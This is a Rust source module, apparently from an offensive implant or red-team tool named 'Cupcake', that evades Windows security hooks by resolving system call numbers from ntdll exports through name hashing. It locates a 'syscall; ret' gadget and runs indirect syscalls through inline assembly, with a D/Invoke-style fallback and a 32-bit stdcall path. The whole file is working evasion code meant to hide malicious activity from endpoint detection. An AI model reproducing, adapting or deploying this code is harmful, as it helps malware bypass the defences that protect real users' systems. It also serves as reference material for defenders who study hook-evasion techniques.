// Syscall Resolution & Execution Module
//
// x86_64: Indirect syscalls via SSN resolution + gadget
// x86: Direct ntdll API calls (no indirect syscall on 32-bit)
//
// Supports: Windows Vista SP2+ (both 32-bit and 64-bit)

#[cfg(all(windows, target_arch = "x86_64"))]
use std::collections::BTreeMap;
#[cfg(all(windows, target_arch = "x86_64"))]
use log::error;

#[cfg(all(windows, target_arch = "x86_64"))]
use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY};

#[cfg(all(windows, target_arch = "x86_64"))]
use winapi::um::winnt::IMAGE_NT_HEADERS64 as IMAGE_NT_HEADERS;

// x86 IMAGE_NT_HEADERS (used by PEB module, not directly here)
#[cfg(all(windows, target_arch = "x86"))]
#[allow(unused_imports)]
use winapi::um::winnt::IMAGE_NT_HEADERS32 as IMAGE_NT_HEADERS;

// ═══════════════════════════════════════════════════════════════════════════════
// x86_64: Full indirect syscall support
// ═══════════════════════════════════════════════════════════════════════════════

#[cfg(all(windows, target_arch = "x86_64"))]
lazy_static::lazy_static! {
    static ref SYSCALL_MAP: BTreeMap<u32, u16> = unsafe { resolve_all_ssns() };
    static ref SYSCALL_GADGET: usize = unsafe { find_syscall_gadget() };
}

/// Resolves SSNs for all Nt* functions in ntdll.dll by sorting them by address.
#[cfg(all(windows, target_arch = "x86_64"))]
unsafe fn resolve_all_ssns() -> BTreeMap<u32, u16> {
    let mut map = BTreeMap::new();
    let ntdll_base = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
    if ntdll_base == 0 { return map; }

    let dos_header = ntdll_base as *const IMAGE_DOS_HEADER;
    let nt_headers = (ntdll_base + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
    let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress as usize;
    if export_dir_rva == 0 { return map; }

    let export_dir = (ntdll_base + export_dir_rva) as *const IMAGE_EXPORT_DIRECTORY;
    let names = (ntdll_base + (*export_dir).AddressOfNames as usize) as *const u32;
    let ordinals = (ntdll_base + (*export_dir).AddressOfNameOrdinals as usize) as *const u16;
    let functions = (ntdll_base + (*export_dir).AddressOfFunctions as usize) as *const u32;

    for i in 0..(*export_dir).NumberOfNames {
        let name_ptr = (ntdll_base + *names.add(i as usize) as usize) as *const i8;
        let mut name_bytes = Vec::new();
        let mut idx = 0;
        while *name_ptr.add(idx) != 0 {
            name_bytes.push(*name_ptr.add(idx) as u8);
            idx += 1;
        }

        let name = String::from_utf8_lossy(&name_bytes).to_string();
        if name.starts_with("Nt") {
            let ordinal = *ordinals.add(i as usize);
            let addr = ntdll_base + *functions.add(ordinal as usize) as usize;
            
            let bytes = std::slice::from_raw_parts(addr as *const u8, 16);
            let mut ssn: Option<u16> = None;

            // Pattern 1: 4C 8B D1, B8 XX XX XX XX (Win10/11, Win8.1, Win7 x64)
            if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8 {
                ssn = Some(u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]) as u16);
            }
            // Pattern 2: B8 XX XX XX XX, 4C 8B D1 (Some older/hooked versions)
            else if bytes[0] == 0xB8 && bytes[5] == 0x4C && bytes[6] == 0x8B && bytes[7] == 0xD1 {
                ssn = Some(u32::from_le_bytes([bytes[1], bytes[2], bytes[3], bytes[4]]) as u16);
            }

            if let Some(s) = ssn {
                let hash = crate::stealth::hash_api_name(name.as_bytes());
                map.insert(hash, s);
                
                let zw_name = name.replacen("Nt", "Zw", 1);
                let zw_hash = crate::stealth::hash_api_name(zw_name.as_bytes());
                map.insert(zw_hash, s);
            }
        }
    }

    crate::utils::db_print(&format!("[Cupcake] Resolved {} syscalls via enhanced patterns.", map.len()));
    map
}

/// Finds a 'syscall; ret' gadget in ntdll.dll for indirect syscalls.
#[cfg(all(windows, target_arch = "x86_64"))]
unsafe fn find_syscall_gadget() -> usize {
    let ntdll_base = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
    if ntdll_base == 0 { return 0; }

    let dos_header = ntdll_base as *const IMAGE_DOS_HEADER;
    let nt_headers = (ntdll_base + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
    
    let section_header = (nt_headers as usize + 24 + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize) as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
    let num_sections = (*nt_headers).FileHeader.NumberOfSections;

    for i in 0..num_sections {
        let section = *section_header.add(i as usize);
        if (section.Characteristics & 0x20000000) != 0 {
            let addr = ntdll_base + section.VirtualAddress as usize;
            let size = *section.Misc.VirtualSize() as usize;
            if size < 3 { continue; }
            let mem = std::slice::from_raw_parts(addr as *const u8, size);

            for j in 0..size - 3 {
                // syscall (0F 05) + ret (C3)
                if mem[j] == 0x0F && mem[j+1] == 0x05 && mem[j+2] == 0xC3 {
                    let gadget = addr + j;
                    crate::utils::db_print(&format!("[Cupcake] Found indirect syscall gadget at: 0x{:X}", gadget));
                    return gadget;
                }
            }
        }
    }

    error!("Failed to find syscall gadget in ntdll!");
    0
}

/// x86_64 indirect syscall execution
#[cfg(all(windows, target_arch = "x86_64"))]
pub unsafe fn indirect_syscall(hash: u32, args: &[usize]) -> i32 {
    let mut use_fallback = false;
    let ssn = match SYSCALL_MAP.get(&hash) {
        Some(&s) => s,
        None => {
            crate::utils::db_print(&format!("[Cupcake] SSN not found for 0x{:X}, using D/Invoke fallback", hash));
            use_fallback = true;
            0
        },
    };

    let gadget = *SYSCALL_GADGET;
    if gadget == 0 && !use_fallback { 
        crate::utils::db_print("[Cupcake] No syscall gadget, using D/Invoke fallback");
        use_fallback = true; 
    }

    let mut result: i32;

    let mut a = [0usize; 11];
    for (i, &v) in args.iter().enumerate() {
        if i < 11 { a[i] = v; }
    }

    if use_fallback {
        return direct_api_call(hash, &a);
    }

    // Indirect syscall via gadget
    std::arch::asm!(
        "mov r12, rsp",
        "sub rsp, 0x68",
        "and rsp, -16",
        
        "mov r13, [r14 + 32]", "mov [rsp + 0x20], r13",
        "mov r13, [r14 + 40]", "mov [rsp + 0x28], r13",
        "mov r13, [r14 + 48]", "mov [rsp + 0x30], r13",
        "mov r13, [r14 + 56]", "mov [rsp + 0x38], r13",
        "mov r13, [r14 + 64]", "mov [rsp + 0x40], r13",
        "mov r13, [r14 + 72]", "mov [rsp + 0x48], r13",
        "mov r13, [r14 + 80]", "mov [rsp + 0x50], r13",
        
        "mov r10, rcx",
        "call r15",
        
        "mov rsp, r12",
        
        inout("rax") ssn as i32 => result,
        in("r14") a.as_ptr(),
        in("r15") gadget,
        out("r10") _,
        out("r12") _,
        out("r13") _,
        in("rcx") a[0],
        in("rdx") a[1],
        in("r8") a[2],
        in("r9") a[3],
        lateout("r11") _,
        clobber_abi("system")
    );

    result
}

/// D/Invoke fallback: call ntdll API directly by hash (x86_64)
#[cfg(all(windows, target_arch = "x86_64"))]
unsafe fn direct_api_call(hash: u32, a: &[usize; 11]) -> i32 {
    let ntdll_base = crate::stealth::peb::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
    if ntdll_base == 0 { return -1; }
    
    let api_addr = crate::stealth::peb::get_api_addr(ntdll_base, hash).unwrap_or(0);
    if api_addr == 0 { return -1; }

    let mut result: i32;
    std::arch::asm!(
        "mov r12, rsp",
        "sub rsp, 0x68",
        "and rsp, -16",
        
        "mov r13, [r14 + 32]", "mov [rsp + 0x20], r13",
        "mov r13, [r14 + 40]", "mov [rsp + 0x28], r13",
        "mov r13, [r14 + 48]", "mov [rsp + 0x30], r13",
        "mov r13, [r14 + 56]", "mov [rsp + 0x38], r13",
        "mov r13, [r14 + 64]", "mov [rsp + 0x40], r13",
        "mov r13, [r14 + 72]", "mov [rsp + 0x48], r13",
        "mov r13, [r14 + 80]", "mov [rsp + 0x50], r13",
        
        "call r15",
        "mov rsp, r12",
        
        in("r14") a.as_ptr(),
        in("r15") api_addr,
        out("r12") _,
        out("r13") _,
        in("rcx") a[0],
        in("rdx") a[1],
        in("r8") a[2],
        in("r9") a[3],
        lateout("rax") result,
        clobber_abi("system")
    );
    result
}

// ═══════════════════════════════════════════════════════════════════════════════
// x86 (32-bit): Direct ntdll API calls via PEB resolution
// No indirect syscalls on 32-bit (sysenter/int 2E is complex and version-dependent)
// ═══════════════════════════════════════════════════════════════════════════════

/// x86 syscall implementation: resolves ntdll API by hash and calls it directly.
/// Uses stdcall convention — all arguments passed on the stack.
#[cfg(all(windows, target_arch = "x86"))]
pub unsafe fn indirect_syscall(hash: u32, args: &[usize]) -> i32 {
    let ntdll_base = crate::stealth::peb::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
    if ntdll_base == 0 { return -1; }
    
    let api_addr = crate::stealth::peb::get_api_addr(ntdll_base, hash).unwrap_or(0);
    if api_addr == 0 {
        crate::utils::db_print(&format!("[Cupcake][x86] API not found for hash 0x{:X}", hash));
        return -1;
    }

    // x86 stdcall: push args right-to-left, then call
    // stdcall callee cleans up the stack
    let argc = args.len();
    let result: i32;
    let args_ptr = args.as_ptr();
    
    std::arch::asm!(
        // Save ESP
        "mov edi, esp",
        // Push args right-to-left using a loop
        "mov ecx, {argc}",
        "test ecx, ecx",
        "jz 99f",
        // edx = &args[argc - 1]
        "mov edx, {args_ptr}",
        "lea edx, [edx + ecx*4 - 4]",
        "98:",
        "push dword ptr [edx]",
        "sub edx, 4",
        "dec ecx",
        "jnz 98b",
        "99:",
        // Call the API
        "call {func}",
        // Restore ESP (stdcall should have cleaned up, but be safe)
        "mov esp, edi",
        
        argc = in(reg) argc,
        args_ptr = in(reg) args_ptr,
        func = in(reg) api_addr,
        out("edi") _,
        out("ecx") _,
        out("edx") _,
        lateout("eax") result,
    );

    result
}

// ═══════════════════════════════════════════════════════════════════════════════
// Non-Windows stub
// ═══════════════════════════════════════════════════════════════════════════════

#[cfg(not(windows))]
pub unsafe fn indirect_syscall(_hash: u32, _args: &[usize]) -> i32 {
    -1
}
